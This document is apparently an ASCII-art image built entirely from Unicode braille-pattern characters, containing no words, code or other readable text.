⠀⠀⡘⣿⣿⣿⣿⣿⣿⣷⣤⣴⣿⣿⣿⣿⣿⠃⢀⠐⡀⠂⠄⢂⠡⢈⠔⡉⠄⢀⠘⡠⠡⠌⡄⢡⠘⡠⢉⠤⡑⢨⠁⢎⠰⡁⢎⡰⢁⢣⢉⡌⡱⣈⠥⡑⡜⡨⠜⠀⠀⠀⠀⠀⢊⠖⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠉⡖⣌⠲⣄⠣⡜⣡⢊⡔⢣⠌⣎⡑⢣⠜⣡⠠⢜⢂⠖⡩⢌⡱⣈⠥⣉⠆⡱⣈⠱⣈⠆⡱⡈⢆⡁⠀
⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⡀⢂⠂⡌⢘⡀⢃⠌⡐⠢⢌⠂⠀⠁⢆⠱⡈⠔⡡⢊⠔⡡⢢⢑⡡⠍⡬⠑⡜⢢⢡⢋⡔⢣⠜⡡⢎⠲⣉⠖⣱⢩⠀⠀⠀⠀⠀⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⢌⠳⣘⢤⠣⢎⡵⢚⡤⢫⡕⢮⡁⠀⢈⠎⣜⠱⣊⠴⣡⠚⡤⡙⠴⣨⠑⢦⠩⡔⠱⡌⠄⠀
⠀⠀⠀⠀⠀⠨⢉⣉⠉⠉⠉⢉⠉⡉⢁⢀⠂⠔⡁⢢⠘⡀⢆⠡⢊⠰⡁⢆⠂⠀⡉⢆⠱⣈⢒⠡⢎⡘⠴⡡⠎⠴⣉⠖⡩⢜⡡⢎⠖⡬⢃⡞⡱⢊⡵⢡⠞⣡⠖⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⣉⠶⣙⢎⠶⣩⠖⣣⢞⣡⠂⠄⡩⢚⣌⢳⡘⢦⡅⢏⡴⣉⠖⣡⢋⢆⠳⣌⠳⢌⠅⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠠⠌⡐⢀⠢⢈⠂⠔⡁⠢⢑⠂⡅⢊⠤⠑⡂⠄⠐⡐⠬⡑⠤⢋⠔⢪⡐⢣⠜⣩⠒⡥⢊⡕⢎⠼⡘⢎⡱⣍⠲⣍⠳⣌⠧⡛⡴⠩⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢌⢞⡱⢎⡳⢥⡛⢦⣋⠖⢀⠠⢡⢋⠦⢣⡙⢆⠞⡌⡖⡡⠞⡤⢋⡌⢣⢆⡹⢌⠂⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠐⠀⠂⠀⠈⠐⠀⠁⠂⠁⠈⠀⠌⠂⠁⠀⢂⡘⠄⠑⠈⠂⠉⠂⠌⠁⠊⠄⠙⠀⠃⠘⠌⠒⠉⠎⠰⠌⠓⠌⠓⠌⠲⠙⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠈⠊⠘⠡⠙⠂⠙⠂⠉⠂⠨⠄⣣⠆⠉⠂⠉⠌⠘⠠⠁⠁⠃⠌⠁⠘⠀⠂⠐⠈⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⡜⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⣃⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⣆⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠑⡌⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⢲⣭⣟⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⢎⡒⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⠀⠀⠀⠉⠙⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠧⠀⠀⠀⠀⠀⢀⠀⡀⢀⠀⡀⢀⠀⡀⢀⠀⣀⠀⡀⢀⠀⡀⣀⠀⣀⢀⡀⡄⣀⠠⣀⡀⠀⠀⠀⠀⣄⡠⡄⢤⠠⠄⠀⠀⠀⠐⠠⠂⠀⠀⠀⢸⡇⠀⠀⠀⢀⡀⡀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⡀⠀⡄⡀⠀⠄⢀⣠⢀⡄⣠⢀⡄⣀⣀⡀⣄⢠⢠⠄⡤⢠⠄⡤⣀⢄⡀⠀⠠⢀⠠⠀⠀⠀
⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⢈⠢⡘⠰⣈⠒⢌⠢⡑⢌⠢⡑⢄⠣⡘⠤⠑⠤⡁⠞⣠⠓⡼⡰⣍⢧⡱⢆⡁⠀⠀⠀⠁⠗⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣞⡇⠀⠀⡘⢦⠰⣉⠳⡔⢦⡐⡄⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⡆⠀⠹⣜⡮⣤⣄⡴⣫⢞⡵⢫⢖⡥⢎⡽⢎⣯⢏⡿⣝⣯⣻⢷⣻⢾⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠐⣎⡳⢤⡀⠀⠀⠀⠀⠀⠀⠀⠁⠁⠀⠈⠀⠁⠈⠀⠐⢀⠂⡐⢀⠂⢁⠂⡑⢠⠁⢊⠁⠓⠈⠂⠙⠈⠆⠀⠀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢉⠀⠀⠀⠘⣆⢻⣘⣯⡽⣶⡹⣜⡆⠡⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣴⠠⠙⠎⠓⠓⠊⠑⢉⠎⡜⢣⠋⣌⢓⡸⡘⣌⠫⠜⠙⠒⠍⠛⠉⠛⠀⠀⢰⣾⣷⣿⡆⠀
⠀⠘⣼⡱⢧⣙⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠄⢊⡐⠤⡈⠄⡘⢄⠣⡘⢠⢀⡀⣀⢀⡀⣀⢀⡀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠀⠀⠀⠀⠀⠎⣧⢹⢶⣻⣳⣻⠮⣝⠳⡌⢲⡀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⢀⠀⣀⢀⡀⠀⣈⢮⣑⢣⡹⢄⠯⣰⠳⣌⡳⣂⢀⣀⣀⣀⣀⣀⠀⠀⠸⣿⣿⣿⡇⠀
⠀⠀⡀⠙⠣⢏⡜⠀⠀⠀⠀⢀⠣⢌⠡⡉⠜⡠⢊⠔⡀⠠⢘⡀⢆⠱⠐⡠⠑⣌⠢⣑⠢⢣⡝⣬⢧⡹⡜⣎⠀⠃⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⢒⠁⠂⠀⠀⠀⠀⠰⢣⠏⠋⠉⢁⣀⣤⡠⡄⢤⡡⢴⠘⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢀⣯⣛⢮⣻⡜⡥⢚⢦⣹⢲⣙⠮⣝⢶⡹⢎⡵⢫⣟⡷⣯⢿⣽⣻⠆⠀⢸⣿⣿⣿⡇⠀
⠀⠠⣟⡶⣤⢀⠈⠀⠀⠀⠀⠀⠎⡄⢣⢘⠰⣁⠎⡐⠠⠐⢂⠜⡠⢃⠡⠄⡃⠦⣑⠢⢍⠳⣜⣣⠞⣵⡹⣖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣃⠄⠮⠙⠈⠈⠀⠁⠉⠠⣝⢎⢳⡁⠀⠀⠀⠀⣄⡐⠁⠀⣰⢏⣶⣫⣟⣧⡟⡴⢩⢞⡲⣏⣞⡹⢞⡼⣱⢫⣜⣻⡾⣿⣽⣿⣾⣿⠂⠀⢠⣾⣷⣿⡦⠀
⠀⠀⣿⢺⡵⣏⡖⠀⠀⠀⠀⢈⢒⡘⠤⣊⠱⣂⠥⢃⡐⠈⡔⢊⡔⢡⠂⢂⠅⢳⢨⡑⢪⡱⢏⡶⣛⢶⡹⣎⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠈⠀⠁⠀⠀⠀⠀⠀⠀⣻⢦⠀⠀⠓⣀⢀⡠⣴⢻⣜⢫⢦⡙⠄⠀⠐⠐⣀⠀⢃⢸⡽⣞⣧⢟⣾⣳⡟⣔⢫⡞⣵⢫⣼⡹⣏⣾⢣⡿⣜⣷⣿⣿⣷⣿⣿⣿⡃⠀⢸⣿⣿⣿⡷⠀
⠀⠀⠋⠿⣱⣏⡞⠀⠀⠀⠀⠐⣊⠔⡣⢌⡓⢤⢃⠣⡐⠐⣌⠧⣜⢢⠜⡠⢎⡵⢢⡝⣢⢝⡽⣎⢷⣫⢷⣹⢆⡀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⢠⣥⣶⠀⠀⠀⠀⠀⠀⠀⠀⣽⢪⣟⣧⣛⡴⢫⢷⣯⠷⣎⡳⢆⡍⠀⠄⣐⠈⠡⠀⡈⣼⡿⣽⣺⢯⡷⣯⣟⢆⢣⢛⡜⣫⠖⣏⢳⠺⣭⢳⡛⣾⣿⣿⣿⣿⣿⣿⡅⠀⢸⣿⣿⣿⡷⠀
⠀⢀⡷⣦⣄⠈⠑⠀⠀⠀⠀⢈⠦⡙⢤⠣⡜⢢⠍⣆⠡⠘⣬⢻⡬⣓⠎⡱⢈⠜⣣⢞⡱⣎⢷⣹⢾⣱⡟⣞⡏⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⠀⠀⠀⠀⠀⠀⣯⣛⠾⣷⢫⡜⣯⢾⣼⢫⣳⣙⠎⡴⢈⣰⠀⣖⡀⡀⣸⣷⣟⣯⣟⣯⡟⣷⣏⠎⣆⠣⡜⢢⢛⢬⢲⡹⣔⢣⡜⣿⣿⣿⣿⣿⣿⣿⡅⠀⢨⣿⣿⣿⣧⠀
⠀⠠⣿⣳⣯⢿⡳⠀⠀⠀⠀⢠⠒⡍⣆⠳⡜⢣⢫⠔⡂⡑⢮⡳⢧⡙⢦⡁⢎⢞⡱⣎⢷⣹⠾⣽⣳⡟⣾⢯⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⠂⠐⠀⠀⠀⢘⣧⠽⠶⠭⣇⢻⣜⡾⣽⣻⢶⣹⣚⢁⣾⡏⠀⣧⣇⢶⣾⣯⣽⣞⡿⣞⣿⣳⣯⡓⢤⢳⡘⢧⣋⣎⢳⠒⠌⠣⣜⣿⣿⣿⣿⣿⣿⣿⡇⠀⣻⣿⣿⣿⣿⠀
⠀⠐⣿⣽⣾⣿⣽⠀⠀⠀⠀⠀⡏⣴⠊⡕⡎⣧⢫⡜⠐⡌⢳⣽⢣⡟⢢⠉⡎⡜⢱⢹⡎⣷⢻⣷⣯⣿⣽⢻⣾⣷⠀⠀⠀⠀⠀⠀⠂⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⢰⣶⣾⣯⣷⣾⢻⣷⣯⣷⣧⡏⢸⣿⠃⡜⣽⣿⣷⡝⡏⣷⣿⢻⣽⣾⣿⣷⡍⢲⢣⡏⣷⣭⠚⣧⢣⡔⢲⣼⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀
⠀⠀⣤⠉⠙⠺⢧⠃⠀⠀⠀⠘⡴⢡⠞⣡⡝⣬⢚⡴⠡⢌⠳⣝⢮⡓⢎⡱⡜⣱⢣⡟⣼⣭⣟⡾⣽⢾⡽⡏⠉⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠌⠛⠳⠿⠛⢾⣻⢾⡽⣞⢮⢙⡼⠋⠀⠀⣿⣿⢻⣷⡜⡼⣟⣿⡿⣽⣻⣷⡉⢶⡹⣜⠶⣭⢻⣜⡣⢜⠲⣼⣿⣿⣿⣿⣿⣿⣿⡅⠀⣹⣿⣿⣿⣯⠀
⠀⠠⣿⣿⣿⣶⣤⡀⠀⠀⠀⡘⠴⣩⢚⡕⡺⣔⢫⡔⢣⢈⢳⣭⢷⡙⡎⠴⣡⢣⢏⣞⡳⢮⡿⣝⣯⢿⣻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⢠⠂⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⢀⡴⣶⢫⣯⠽⡎⠡⢊⠔⡡⠄⠀⣻⣿⡎⣿⣿⣿⣿⡿⣽⣿⣻⣷⡉⢖⡹⢎⡻⣜⠳⢊⢁⡀⠈⢰⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠀
⠀⢐⣿⣿⣿⣿⣿⠄⠀⠀⢀⠰⣍⠲⣍⢞⡱⢎⡳⣜⠡⢂⡽⣎⢧⡹⣌⠳⢤⣋⡞⣾⣙⢯⣟⡿⣽⣻⣿⣿⠀⠀⠚⡴⣀⢀⠀⠀⢠⣠⣤⣤⣄⢿⠁⠀⠀⠀⠀⠀⠀⣼⣿⣦⠀⠰⣆⢾⣳⢿⡽⡻⠜⠃⠀⢂⡱⠞⡁⠀⠀⢿⣿⣷⢻⣿⣾⣷⣿⣿⣿⣿⣷⡉⢮⡝⣯⡳⠉⠀⠘⣣⠹⣄⢸⣿⣿⣿⣿⣿⣿⣿⡇⠂⣿⣿⣿⣿⣿⠀
⠀⠈⣛⠻⠿⠿⣿⠆⠀⠀⢀⠲⣌⠳⡜⢮⡱⣏⢵⢪⡑⢢⢙⣿⠲⣝⢮⡙⢆⡳⣜⢶⡭⣯⢿⣽⣿⡟⠿⠀⠀⠀⢀⡄⡀⠉⠖⠄⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣷⣌⣈⠓⠉⠓⠉⠀⠀⢠⢉⠖⠁⠀⢠⠀⣰⣶⣶⣽⡂⢻⣿⣿⣿⣿⣿⣿⣷⡹⣘⡿⣧⡟⡶⡲⠄⣄⠓⣌⢺⣿⣿⣿⣿⣿⣿⣿⡇⡁⣿⣿⣿⣿⣿⠀
⠀⢘⣿⣿⣷⣶⣷⡄⠀⠀⢀⠣⣜⢣⡝⣣⠽⡜⣎⠳⡌⢄⢫⣞⠛⣜⢢⡝⢪⢷⡹⢎⡷⢯⣿⣾⣟⣇⠀⠀⠀⡉⢀⣈⠓⠣⣤⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢀⣴⣿⣖⢀⣽⣿⣿⣿⣿⣿⠀⡤⠀⠀⠀⠀⠀⠀⠀⠈⢀⣡⣼⣿⣿⣿⣷⢹⣿⣿⣿⣿⣿⣿⣿⠥⣹⠊⠁⢠⣰⡽⣻⡜⡯⢔⣻⣿⣿⣿⣿⣿⣿⣿⡗⡀⣿⣿⣿⣿⣿⠀
⠀⢨⣿⣿⣿⣿⣿⡇⠀⠀⢀⠳⣌⢳⡚⣵⢫⡝⣮⠳⡜⡐⢎⡾⡽⣜⡷⣚⢧⣻⡽⣟⡾⣯⣿⣞⣿⡇⠀⢬⡑⠌⠃⠈⠓⠒⠄⡉⠀⠀⠀⠀⠀⠁⠁⢀⣴⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⣀⢄⢢⠒⡌⢹⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣯⡓⠤⢀⠜⣣⣏⡼⢳⡙⢦⣓⣾⣿⣿⣿⣿⣿⣿⣿⡧⢱⣿⣿⣿⣿⣿⠀
⠀⠘⣿⣿⣿⣿⣿⣏⠀⠀⢠⢓⡼⢣⡻⣜⢧⠿⣜⣳⠱⡘⢬⢳⡹⢯⡷⡹⢎⣷⣟⣿⣽⣳⣿⢿⣿⣿⣆⠀⠤⣔⡠⠀⠀⢀⠀⡀⠀⢠⢲⣦⣶⣶⣶⣤⣬⣿⣿⣿⣿⣿⣿⠋⠀⡠⢆⡳⣌⠞⣦⢛⡴⣡⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡜⣿⣿⣿⣿⣿⣿⡑⠈⡐⢮⡱⢯⣟⣧⣿⢯⣷⣻⣿⣿⣿⣿⣿⣿⣿⣗⣣⣿⣿⣿⣿⣿⠀
⠀⢸⣼⣿⣿⣽⣿⡤⠀⠀⠠⢏⡼⣳⡝⣮⢟⣯⣟⡼⢣⢉⡎⢧⡘⢧⡻⣍⣛⢾⡽⣾⡳⣯⣿⣿⣿⣿⣿⣇⠰⢌⡳⣜⡈⢆⠹⢘⠥⠘⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⡰⡑⢮⡵⣺⡽⣮⡟⣾⡱⣏⠖⣌⡙⠻⢿⣿⣿⣿⣿⣿⣿⣿⡜⣿⣿⣿⣿⣷⡍⢲⠱⢆⡉⠀⢻⣷⣿⣿⡾⣿⣿⣿⣿⣿⣿⣿⣿⡷⣻⣿⣿⣿⣿⣿⠀
⠀⢸⣿⣿⣿⣿⣿⣟⠀⠀⠘⣬⠳⢧⣻⢼⣛⡾⣾⣹⢃⠎⡜⣧⢹⢯⣷⡹⣜⢫⡿⣵⢯⡷⣿⣿⣿⣿⣿⣿⣆⠀⠓⣌⠳⡎⢄⠁⣠⢳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠠⡑⢭⡲⣝⣷⣻⢷⣻⡵⣛⡬⣛⡴⣹⢒⡌⠹⣟⠿⣿⣿⣿⣿⣿⡹⣿⣿⣿⣷⢍⡲⣀⡀⢨⠱⡠⢟⡿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣽⣿⣿⣿⣿⣿⠀
⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⢈⠴⣫⢷⡹⡾⣽⣻⡵⣏⣎⠸⣘⡷⣯⣟⡾⡵⢎⣿⣽⣿⣯⣟⣿⣿⣿⣿⣿⣿⣿⠀⠠⢌⠃⢀⠎⣴⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⢢⡙⢦⣝⡾⣼⢯⣿⣱⣏⡳⣕⣣⠞⣥⢋⠲⠁⡱⢦⡜⢻⣿⣿⣿⡇⣻⣿⣿⣟⠦⣙⢧⢳⡠⣭⢱⣠⣻⣼⣷⣿⣿⣿⣿⣿⣿⣿⣿⣏⣾⣿⣿⣿⣿⣿⠀
⠀⢨⣽⣿⣿⣿⣿⣧⠀⠀⠂⡜⣱⢏⣷⡻⣷⣏⣿⡳⣌⠒⢬⣻⢷⣯⣟⣱⢫⣾⢿⣿⢷⡿⣿⣿⣿⣿⣿⣿⣷⠀⢣⢎⡳⢎⠀⠋⣾⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⢨⠱⣜⢳⢮⡿⣽⣻⢾⣱⣎⢷⡱⢮⡝⣎⢇⢂⣴⣿⡌⢹⣿⣿⣿⣿⡇⣿⣿⣿⣿⡘⡱⢎⢣⠳⣘⢧⡷⣻⣭⢿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣷⣿⣿⣿⣿⣿⠀
⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠐⣌⢳⢯⡾⣽⣳⣟⣾⡳⢥⠚⢬⣟⡿⣮⢿⡽⣯⢿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⠀⠡⣎⠵⡊⢀⢀⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⡈⢆⡳⡜⣯⢾⡽⣷⣻⢯⡷⣞⢧⡝⣶⡹⣜⠮⡄⢻⣿⣿⣿⣿⣿⣿⣿⢧⣿⣿⣿⡷⣱⡹⣌⣦⠽⣜⢾⡼⣽⢯⡿⣽⣿⣿⣿⣿⣿⣿⣿⢧⢻⣿⣿⣿⣿⣿⠀
⠀⢸⣿⣿⣿⣿⣿⣿⠄⠀⠂⠤⣫⢟⡞⠷⢻⣞⣷⣛⠦⣉⠲⣌⢳⡙⢮⡹⣭⢻⢾⣝⡳⣯⣿⣿⣿⣿⣿⣿⡿⠀⡑⢎⡳⢩⠄⢸⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠐⡌⢲⡱⣝⢮⡿⣽⣻⣯⢿⣽⡻⣮⡝⣶⡹⢎⡳⣅⠸⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⡟⣴⣻⣿⣾⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢧⣻⣿⣿⣿⣿⣿⠀
⠀⠸⠿⠿⡿⠿⠿⠛⠀⠀⠀⠄⠁⠈⠀⢀⣠⣟⡾⣝⡲⢄⠳⣬⢇⡏⣗⡳⣭⢻⡾⣭⢷⣿⣿⣿⣿⣿⣿⣿⡇⠀⢜⢪⡕⢣⠌⠀⢻⣿⡟⠉⠀⠀⠀⠠⠈⠀⠀⠀⠁⠈⠑⠃⠟⠾⣽⣻⡷⣿⢯⣷⣻⢧⣛⠶⢹⢧⡓⢮⡄⢹⣿⣿⣿⣿⢿⣿⢸⣿⣿⣿⡟⡴⣿⣿⣿⣿⣯⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡣⢼⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⣀⡀⣀⣀⠀⠀⠀⢀⠆⡀⠐⣯⢾⣽⢻⡝⠒⠌⣱⠳⣎⠽⣸⢱⣋⠷⣹⡝⣞⢯⣿⣿⣿⣿⣿⡟⠀⠀⢎⢲⣉⠖⠀⠀⠀⠁⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢟⡾⣵⢻⡌⠃⣸⢲⡹⢦⡹⡀⢿⣿⣿⡇⡏⡿⣾⣿⣿⡿⡝⢼⣻⣯⣿⣷⣿⣟⣿⣟⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡅⠸⢿⣿⣿⣿⣿⠀
⠀⢰⠂⢸⣿⡯⣝⠯⠀⠀⠀⠠⣈⠀⢀⢾⡹⢎⡥⢌⣡⠠⣄⣫⢌⣣⢥⣣⣜⣣⢳⣜⣼⣪⣽⣿⣿⣿⡗⠀⠀⠘⣌⠲⣡⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠈⠃⣠⡞⣷⣋⡗⣣⢇⠵⢸⣿⣿⣯⢁⢇⣿⣿⣯⢷⣜⣤⣏⢷⡹⣎⣳⡝⣾⣹⣿⣷⣿⣾⣿⣿⣿⣿⣿⣿⠂⢰⣿⣿⣿⣿⣿⠀
⠀⠸⠁⠀⣿⣱⣼⣶⠀⠀⡀⠢⣕⠂⠈⣯⢟⣯⣞⠿⣞⣿⣳⢯⣿⡽⣯⣷⣻⣟⣯⣿⣷⣿⣿⣿⣿⡟⠀⠀⠀⢡⢢⡙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠧⢯⢼⡱⣊⠂⣼⢯⣿⢇⢎⣾⣿⣿⣿⣿⣿⣾⡿⣟⣿⣽⢷⣻⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⢸⣿⣿⣿⣿⣿⠀
⠀⢸⠀⢘⣿⣿⢾⣿⠀⠐⠠⠐⢮⠀⠀⣻⡞⣷⡞⣿⡽⣾⡽⣯⢿⣽⣻⣽⣿⣿⣯⣿⣾⢿⣿⣿⡟⠀⠀⠀⠀⢂⠆⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢖⡣⢁⣼⡟⣾⣿⢫⣾⣿⢿⣿⣿⡿⣿⣽⡿⣿⣟⡿⣟⣿⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⠀
⠀⢸⠀⠈⣿⡿⠛⠋⠀⠈⠄⠀⢯⠀⠀⣳⣟⣳⣟⣷⣻⢷⣻⣯⢿⣯⣿⢿⣯⣿⣟⣿⡿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⡠⣿⣿⣹⣿⢏⣾⣿⣿⣿⣿⡿⣿⣿⣳⣿⣟⡿⣟⣿⢾⣻⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⡍⠒⡀⠌⢉⠀⠡⠁⠀
⠀⠘⠁⠠⠀⠀⠀⠀⠀⠈⠆⢘⡸⠄⠀⣳⢯⣷⣻⢾⡽⣯⢷⣯⣿⣞⣿⣻⣷⢿⣞⣷⣿⣿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠘⢿⢧⣿⠏⡎⣷⣿⡿⣿⣿⢿⣽⣷⡿⢿⣾⣻⣯⣟⣯⢷⢯⣟⣯⢿⡻⣝⢎⠧⣓⡱⢌⠡⠐⡈⠄⡈⠡⠀⠀
⠀⠀⠀⢠⠁⠀⡀⠄⠀⠈⡄⢠⡙⠆⠀⢼⣛⡶⢯⣻⢽⣯⣟⣾⣳⣟⣯⣿⡽⣿⣽⣾⣿⡭⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣂⡀⠘⣿⠏⠀⡇⠉⠃⠉⠉⠉⠋⠉⠁⠁⠈⠁⠉⠈⠁⠈⠙⠾⡼⣘⠧⡓⡜⢬⠓⡥⢚⡄⢂⠡⠐⠠⢀⠡⠀⠀
⠀⠀⠀⠀⠆⠁⠀⠀⠀⠀⠐⠠⡙⠆⠀⠺⣵⣫⢷⣫⣞⢷⣻⣞⡷⣯⣟⣾⡽⣟⣷⣻⡿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⢠⠀⠀⠀⢀⠀⠀⠀⠀⠀⢠⠁⢀⣻⣿⣿⠀⠉⠀⠀⡇⠶⠲⡔⢲⠳⡞⢖⡣⠄⠀⢶⣒⢶⡲⢤⢎⡳⢅⡣⢎⡱⢊⢥⢋⠴⢣⠘⠠⠐⡀⠡⠀⠄⠀⠀
